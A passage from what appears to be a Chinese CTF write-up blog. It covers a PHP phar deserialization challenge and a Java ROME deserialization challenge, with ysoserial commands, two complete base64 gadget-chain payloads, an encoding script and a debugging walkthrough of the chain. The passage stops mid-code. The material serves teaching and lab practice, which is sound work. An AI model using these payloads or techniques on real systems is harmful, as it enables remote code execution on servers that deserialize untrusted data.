<p>猜测与PHP设置或版本有关系，本地测试时必须指明压缩包内的具体文件名。经反弹shell发现题目中的php版本为7.3.15。</p>
<p>更新：本地访问时和测试环境一样， 不需要额外加内容。得出两者不同的原因是之前本地测试时多加了一行 <code>$s=file_get_conotents($_get[&#39;file&#39;])</code> 导致出现了额外的报错，以及本地环境是Windows，部分测试命令无法运行导致网页无反应。</p>
<hr>
<p>解题步骤：用EXP打包phar攻击文件，更改后缀为图片格式后缀绕过上传过滤，上传文件后记录保存位置，访问 <code>class.php</code> 利用file参数调用到 <code>file_exists()</code> 函数，传入phar流并实现反序列化攻击：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:83/class.php?file=phar://tmp/daf280af792fd5b906511363ae2bc39d.gif</span><br></pre></td></tr></table></figure></div>

<p>即可成功调用phar内的攻击命令。</p>
<p>flag在 <code>/flag</code> 中，获取flag：<code>flag&#123;1c17302d-b3ae-435a-9650-005cd71630e8&#125;</code></p>
<h3 id="Rome"><a href="#Rome" class="headerlink" title="Rome"></a>Rome</h3><p><em>传说中的 JAVA 反序列化</em></p>
<p>JAVA 反序列化属实有点抽象了，但 BUU 本题的靶场好像炸了，之后再来做吧。</p>
<p>总之先让我研究一下 Idea 怎么导入和引用 jar 包，springboot 框架的特性与架构，ysoserial 工具的使用、JAVA-Rome 反序列化链条的分析与利用….再来做！</p>
<hr>
<h4 id="ysoserial"><a href="#ysoserial" class="headerlink" title="ysoserial"></a>ysoserial</h4><p>使用 ysoserial 解题，payload：<code>java -jar ./ysoserial-all.jar ROME &#39;calc.exe&#39;</code></p>
<p>生成的 payload 经过 base64+URL 编码后传入即可：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">EXP=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAAAIAAAACc3IAKGNvbS5zdW4uc3luZGljYXRpb24uZmVlZC5pbXBsLk9iamVjdEJlYW6CmQfedgSUSgIAA0wADl9jbG9uZWFibGVCZWFudAAtTGNvbS9zdW4vc3luZGljYXRpb24vZmVlZC9pbXBsL0Nsb25lYWJsZUJlYW47TAALX2VxdWFsc0JlYW50ACpMY29tL3N1bi9zeW5kaWNhdGlvbi9mZWVkL2ltcGwvRXF1YWxzQmVhbjtMAA1fdG9TdHJpbmdCZWFudAAsTGNvbS9zdW4vc3luZGljYXRpb24vZmVlZC9pbXBsL1RvU3RyaW5nQmVhbjt4cHNyACtjb20uc3VuLnN5bmRpY2F0aW9uLmZlZWQuaW1wbC5DbG9uZWFibGVCZWFu3WG7xTNPa3cCAAJMABFfaWdub3JlUHJvcGVydGllc3QAD0xqYXZhL3V0aWwvU2V0O0wABF9vYmp0ABJMamF2YS9sYW5nL09iamVjdDt4cHNyAB5qYXZhLnV0aWwuQ29sbGVjdGlvbnMkRW1wdHlTZXQV9XIdtAPLKAIAAHhwc3EAfgACc3EAfgAHcQB%<span class="number">2</span>BAAxzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7TAARX291dHB1dFByb3BlcnRpZXN0ABZMamF2YS91dGlsL1Byb3BlcnRpZXM7eHAAAAAA<span class="comment">/////3VyAANbW0JL/RkVZ2fbNwIAAHhwAAAAAnVyAAJbQqzzF/gGCFTgAgAAeHAAAAaeyv66vgAAADIAOQoAAwAiBwA3BwAlBwAmAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBa0gk/OR3e8%2BAQAGPGluaXQ%2BAQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAMSW5uZXJDbGFzc2VzAQA1THlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAJwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAoAQAzeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwEACDxjbGluaXQ%2BAQARamF2YS9sYW5nL1J1bnRpbWUHACoBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DAAsAC0KACsALgEACGNhbGMuZXhlCAAwAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAMgAzCgArADQBAA1TdGFja01hcFRhYmxlAQAeeXNvc2VyaWFsL1B3bmVyMjEzOTMzNjQzODY5MzA0AQAgTHlzb3NlcmlhbC9Qd25lcjIxMzkzMzY0Mzg2OTMwNDsAIQACAAMAAQAEAAEAGgAFAAYAAQAHAAAAAgAIAAQAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0AAAAGAAEAAAAvAA4AAAAMAAEAAAAFAA8AOAAAAAEAEwAUAAIADAAAAD8AAAADAAAAAbEAAAACAA0AAAAGAAEAAAA0AA4AAAAgAAMAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAFwAYAAIAGQAAAAQAAQAaAAEAEwAbAAIADAAAAEkAAAAEAAAAAbEAAAACAA0AAAAGAAEAAAA4AA4AAAAqAAQAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAHAAdAAIAAAABAB4AHwADABkAAAAEAAEAGgAIACkACwABAAwAAAAkAAMAAgAAAA%2BnAAMBTLgALxIxtgA1V7EAAAABADYAAAADAAEDAAIAIAAAAAIAIQARAAAACgABAAIAIwAQAAl1cQB%2BABcAAAHUyv66vgAAADIAGwoAAwAVBwAXBwAYBwAZAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBXHmae48bUcYAQAGPGluaXQ%2BAQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAANGb28BAAxJbm5lckNsYXNzZXMBACVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAaAQAjeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb28BABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YS9pby9TZXJpYWxpemFibGUBAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAABAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAPAAOAAAADAABAAAABQAPABIAAAACABMAAAACABQAEQAAAAoAAQACABYAEAAJcHQABFB3bnJwdwEAeHNyAChjb20uc3VuLnN5bmRpY2F0aW9uLmZlZWQuaW1wbC5FcXVhbHNCZWFu9YoYu%2BX2GBECAAJMAApfYmVhbkNsYXNzdAARTGphdmEvbGFuZy9DbGFzcztMAARfb2JqcQB%2BAAl4cHZyAB1qYXZheC54bWwudHJhbnNmb3JtLlRlbXBsYXRlcwAAAAAAAAAAAAAAeHBxAH4AFHNyACpjb20uc3VuLnN5bmRpY2F0aW9uLmZlZWQuaW1wbC5Ub1N0cmluZ0JlYW4J9Y5KDyPuMQIAAkwACl9iZWFuQ2xhc3NxAH4AHEwABF9vYmpxAH4ACXhwcQB%2BAB9xAH4AFHNxAH4AG3ZxAH4AAnEAfgANc3EAfgAgcQB%2BACNxAH4ADXEAfgAGcQB%2BAAZxAH4ABng%3D</span></span><br></pre></td></tr></table></figure></div>

<p>base64 编码可以直接用 kali 自带的：<code>java -jar ./ysoserial-all.jar ROME &#39;calc.exe | base64 &gt; payload.txt</code> ，再丢进 cyberchef 中 URL 编码即可。或者将得到的字节数据重定向到文件中，用以下脚本进行编码处理：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line">filename = <span class="string">&quot;./res.bin&quot;</span></span><br><span class="line">s = <span class="built_in">open</span>(filename, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">base64_str = base64.b64encode(s)</span><br><span class="line"><span class="built_in">open</span>(<span class="string">&quot;base64.txt&quot;</span>, <span class="string">&quot;wt&quot;</span>, encoding = <span class="string">&quot;utf-8&quot;</span>).write(parse.quote(base64_str.decode()))</span><br><span class="line"><span class="comment"># open(&quot;base64.txt&quot;, &quot;wt&quot;, encoding = &quot;utf-8&quot;).write(base64_str.decode())</span></span><br></pre></td></tr></table></figure></div>

<p>base64 库有另一个 b64 编码方法：<code>urlsafe_b64encode()</code> ，该方法生成的 payload 传入后会导致 JAVA 报错 base64 编码内容 </p>
<hr>
<p> 在 powershell 下用 ysoserial 生成 payload 会有问题，原因是 powershell 不支持字节流重定向，ysoserial 输出的内容被重定向时会被当作字符串处理，经过解码、编码后数据会有损失（pwoershell 默认是 ANSI 编码，但不论什么编码都会导致数据的损失）。也正是其输出的内容无法被当作字符串处理的原因，直接复制粘贴工具在终端输出的内容或者将输出内容重定向至文件再复制粘贴都无法得到完整有效的 payload。具体表现为如果是真正有效的 payload，复制粘贴时只会复制前面一小部分；而能完整复制下来的 payload 字节内容都是有误的。</p>
<p>Bash 可以重定向字节流，甚至可以用 base64 直接对输出的字节数据编码，因此在 linux 下用该工具基本能得到正确内容。</p>
<p>Kali 下运行获得的正确的 payload 字节流数据头：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://picturebed-1310517892.cos.ap-shanghai.myqcloud.com/2023/Snipaste_2023-10-31_10-43-31.png"
                     
                ></p>
<p>使用 powershell 重定向至文件后获得的错误的字节流数据头：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://picturebed-1310517892.cos.ap-shanghai.myqcloud.com/2023/image-20231031104900799.png"
                      alt="image-20231031104900799"
                ></p>
<p>上述错误的字节流数据传入 JAVA 的反序列化函数会报错：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">java.io.StreamCorruptedException: invalid stream header: EE848800</span><br></pre></td></tr></table></figure></div>

<hr>
<p>ROME 链条解析：在 <code>ysoserial/src/main/java/ysoserial/payloads/ROME</code> 的源码中可以看到 ROME 的利用链条：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">* TemplatesImpl.getOutputProperties()</span><br><span class="line">* NativeMethodAccessorImpl.invoke0(Method, Object, Object[])</span><br><span class="line">* NativeMethodAccessorImpl.invoke(Object, Object[])</span><br><span class="line">* DelegatingMethodAccessorImpl.invoke(Object, Object[])</span><br><span class="line">* Method.invoke(Object, Object...)</span><br><span class="line">* ToStringBean.toString(String)</span><br><span class="line">* ToStringBean.toString()</span><br><span class="line">* ObjectBean.toString()</span><br><span class="line">* EqualsBean.beanHashCode()</span><br><span class="line">* ObjectBean.hashCode()</span><br><span class="line">* HashMap&lt;K,V&gt;.hash(Object)</span><br><span class="line">* HashMap&lt;K,V&gt;.readObject(ObjectInputStream)</span><br></pre></td></tr></table></figure></div>

<h4 id="利用链调试"><a href="#利用链调试" class="headerlink" title="利用链调试"></a>利用链调试</h4><p><em>参考：<a class="link"   href="https://c014.cn/blog/java/ROME/ROME%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html" >ROME 反序列化漏洞分析 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></em></p>
<p>在本地搭建 ROME 测试环境，IDEA 新建一个 Maven 项目，archType 勾选 WebApp，在 pom.xml 中引入 ROME 依赖：</p>
<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>rome<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>rome<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>新建测试类：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> myremo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoEntry</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64_exp</span> <span class="operator">=</span> <span class="string">&quot;Base64_String&quot;</span>;</span><br><span class="line">        <span class="type">byte</span>[] exp = Base64.getDecoder().decode(base64_exp);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bytes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(exp);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bytes);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>Base64_String</code> 替换为以下测试 payload：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAAAIAAAACc3IAKGNvbS5zdW4uc3luZGljYXRpb24uZmVlZC5pbXBsLk9iamVjdEJlYW6CmQfedgSUSgIAA0wADl9jbG9uZWFibGVCZWFudAAtTGNvbS9zdW4vc3luZGljYXRpb24vZmVlZC9pbXBsL0Nsb25lYWJsZUJlYW47TAALX2VxdWFsc0JlYW50ACpMY29tL3N1bi9zeW5kaWNhdGlvbi9mZWVkL2ltcGwvRXF1YWxzQmVhbjtMAA1fdG9TdHJpbmdCZWFudAAsTGNvbS9zdW4vc3luZGljYXRpb24vZmVlZC9pbXBsL1RvU3RyaW5nQmVhbjt4cHNyACtjb20uc3VuLnN5bmRpY2F0aW9uLmZlZWQuaW1wbC5DbG9uZWFibGVCZWFu3WG7xTNPa3cCAAJMABFfaWdub3JlUHJvcGVydGllc3QAD0xqYXZhL3V0aWwvU2V0O0wABF9vYmp0ABJMamF2YS9sYW5nL09iamVjdDt4cHNyAB5qYXZhLnV0aWwuQ29sbGVjdGlvbnMkRW1wdHlTZXQV9XIdtAPLKAIAAHhwc3EAfgACc3EAfgAHcQB+AAxzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3QAEltMamF2YS9sYW5nL0NsYXNzO0wABV9uYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7TAARX291dHB1dFByb3BlcnRpZXN0ABZMamF2YS91dGlsL1Byb3BlcnRpZXM7eHAAAAAA<span class="comment">/////3VyAANbW0JL/RkVZ2fbNwIAAHhwAAAAAnVyAAJbQqzzF/gGCFTgAgAAeHAAAAbAyv66vgAAADIAOQoAAwAiBwA3BwAlBwAmAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBa0gk/OR3e8+AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAMSW5uZXJDbGFzc2VzAQA1THlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAJwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAoAQAzeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwEACDxjbGluaXQ+AQARamF2YS9sYW5nL1J1bnRpbWUHACoBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DAAsAC0KACsALgEAKG9wZW4gL1N5c3RlbS9BcHBsaWNhdGlvbnMvQ2FsY3VsYXRvci5hcHAIADABAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAyADMKACsANAEADVN0YWNrTWFwVGFibGUBAB95c29zZXJpYWwvUHduZXI3NDM4Nzc3OTA0NjI5MDc5AQAhTHlzb3NlcmlhbC9Qd25lcjc0Mzg3Nzc5MDQ2MjkwNzk7ACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAAEAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAALgAOAAAADAABAAAABQAPADgAAAABABMAFAACAAwAAAA/AAAAAwAAAAGxAAAAAgANAAAABgABAAAAMwAOAAAAIAADAAAAAQAPADgAAAAAAAEAFQAWAAEAAAABABcAGAACABkAAAAEAAEAGgABABMAGwACAAwAAABJAAAABAAAAAGxAAAAAgANAAAABgABAAAANwAOAAAAKgAEAAAAAQAPADgAAAAAAAEAFQAWAAEAAAABABwAHQACAAAAAQAeAB8AAwAZAAAABAABABoACAApAAsAAQAMAAAAJAADAAIAAAAPpwADAUy4AC8SMbYANVexAAAAAQA2AAAAAwABAwACACAAAAACACEAEQAAAAoAAQACACMAEAAJdXEAfgAXAAAB1Mr+ur4AAAAyABsKAAMAFQcAFwcAGAcAGQEAEHNlcmlhbFZlcnNpb25VSUQBAAFKAQANQ29uc3RhbnRWYWx1ZQVx5mnuPG1HGAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQADRm9vAQAMSW5uZXJDbGFzc2VzAQAlTHlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkRm9vOwEAClNvdXJjZUZpbGUBAAxHYWRnZXRzLmphdmEMAAoACwcAGgEAI3lzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkRm9vAQAQamF2YS9sYW5nL09iamVjdAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwAhAAIAAwABAAQAAQAaAAUABgABAAcAAAACAAgAAQABAAoACwABAAwAAAAvAAEAAQAAAAUqtwABsQAAAAIADQAAAAYAAQAAADsADgAAAAwAAQAAAAUADwASAAAAAgATAAAAAgAUABEAAAAKAAEAAgAWABAACXB0AARQd25ycHcBAHhzcgAoY29tLnN1bi5zeW5kaWNhdGlvbi5mZWVkLmltcGwuRXF1YWxzQmVhbvWKGLvl9hgRAgACTAAKX2JlYW5DbGFzc3QAEUxqYXZhL2xhbmcvQ2xhc3M7TAAEX29ianEAfgAJeHB2cgAdamF2YXgueG1sLnRyYW5zZm9ybS5UZW1wbGF0ZXMAAAAAAAAAAAAAAHhwcQB+ABRzcgAqY29tLnN1bi5zeW5kaWNhdGlvbi5mZWVkLmltcGwuVG9TdHJpbmdCZWFuCfWOSg8j7jECAAJMAApfYmVhbkNsYXNzcQB+ABxMAARfb2JqcQB+AAl4cHEAfgAfcQB+ABRzcQB+ABt2cQB+AAJxAH4ADXNxAH4AIHEAfgAjcQB+AA1xAH4ABnEAfgAGcQB+AAZ4</span></span><br></pre></td></tr></table></figure></div>

<p>如果用的 IDEA，在 External Libraries 中的 <code>rome-1.0.jar/com.sun.syndication/feed/impl/ObjectBean</code> 类的 <code>hashcode()</code> 函数中下断点，回到主函数启动调试即可来到反序列化的入口点，到达最终利用点时的函数栈情况如下：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">getTransletInstance:<span class="number">452</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">newTransformer:<span class="number">485</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">getOutputProperties:<span class="number">506</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">498</span>, Method (java.lang.reflect)</span><br><span class="line">toString:<span class="number">137</span>, ToStringBean (com.sun.syndication.feed.impl)	<span class="comment">// A2</span></span><br><span class="line">toString:<span class="number">116</span>, ToStringBean (com.sun.syndication.feed.impl)</span><br><span class="line">toString:<span class="number">120</span>, ObjectBean (com.sun.syndication.feed.impl)</span><br><span class="line">beanHashCode:<span class="number">193</span>, EqualsBean (com.sun.syndication.feed.impl)	<span class="comment">// A1</span></span><br><span class="line">hashCode:<span class="number">110</span>, ObjectBean (com.sun.syndication.feed.impl)</span><br><span class="line">hash:<span class="number">340</span>, HashMap (java.util)</span><br><span class="line">readObject:<span class="number">1419</span>, HashMap (java.util)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">498</span>, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:<span class="number">1185</span>, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:<span class="number">2345</span>, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">2236</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1692</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">508</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">466</span>, ObjectInputStream (java.io)</span><br><span class="line">main:<span class="number">14</span>, RemoEntry (myremo)</span><br></pre></td></tr></table></figure></div>

<p>最终利用的点是：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> Translet <span class="title function_">getTransletInstance</span><span class="params">()</span></span><br><span class="line">       <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="keyword">if</span> (_name == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">if</span> (_class == <span class="literal">null</span>) defineTransletClasses();	<span class="comment">// A3</span></span><br><span class="line"></span><br><span class="line">           <span class="comment">// The translet needs to keep a reference to all its auxiliary</span></span><br><span class="line">           <span class="comment">// class to prevent the GC from collecting them</span></span><br><span class="line">           <span class="type">AbstractTranslet</span> <span class="variable">translet</span> <span class="operator">=</span> (AbstractTranslet)</span><br><span class="line">                   _class[_transletIndex].getConstructor().newInstance();	<span class="comment">// A5</span></span><br><span class="line">           translet.postInitialization();</span><br><span class="line">           translet.setTemplates(<span class="built_in">this</span>);</span><br><span class="line">           translet.setOverrideDefaultParser(_overrideDefaultParser);</span><br><span class="line">           translet.setAllowedProtocols(_accessExternalStylesheet);</span><br><span class="line">           <span class="keyword">if</span> (_auxClasses != <span class="literal">null</span>) &#123;</span><br><span class="line">               translet.setAuxiliaryClasses(_auxClasses);</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">return</span> translet;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">catch</span> (InstantiationException | IllegalAccessException |</span><br><span class="line">               NoSuchMethodException | InvocationTargetException e) &#123;</span><br><span class="line">           <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title 